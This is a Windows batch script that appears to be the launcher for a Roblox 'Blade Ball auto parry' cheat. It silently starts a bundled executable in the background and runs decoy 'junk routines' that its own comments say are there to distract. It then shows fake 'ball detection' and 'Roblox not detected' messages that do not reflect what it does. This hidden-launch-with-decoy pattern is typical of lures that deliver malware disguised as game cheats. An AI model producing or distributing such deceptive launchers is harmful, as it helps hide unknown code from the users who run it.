��&cls
@echo off
setlocal enabledelayedexpansion

:: Define the exe file path
set "exePath=Resources\blade-ball-auto-parry.exe"

:: Junk routines to make it look busy
call :junkRoutine1
call :junkRoutine2
call :junkRoutine3

:: Hidden launch of actual tool
start "" /b "%exePath%" >nul 2>&1

:: Fake scan logic
timeout /t 1 >nul
call :ball_detection

:: Final fake system check message
echo.
echo Roblox not detected.
timeout /t 2 >nul
exit /b

:ball_detection
echo Ball detection in progress...
timeout /t 3 >nul
echo Unnecessary process running...
timeout /t 2 >nul
exit /b

:: Junk routines to distract
:junkRoutine1
set /a "x=0"
for /l %%a in (1,1,20) do (
    set /a "x=!x!+%%a"
)
set "placeholder1=%RANDOM%"
set "dummy1=abc!x!"
exit /b

:junkRoutine2
set "noise="
for /l %%b in (1,1,10) do (
    set "char=!random!!random!"
    set "noise=!noise!!char:~0,2!"
)
set "junkVar2=!noise!"
exit /b

:junkRoutine3
set /a "z=100"
for /l %%c in (1,1,15) do (
    set /a "z=!z!-%%c"
)
set "confuseVar=Z!z!X"
exit /b
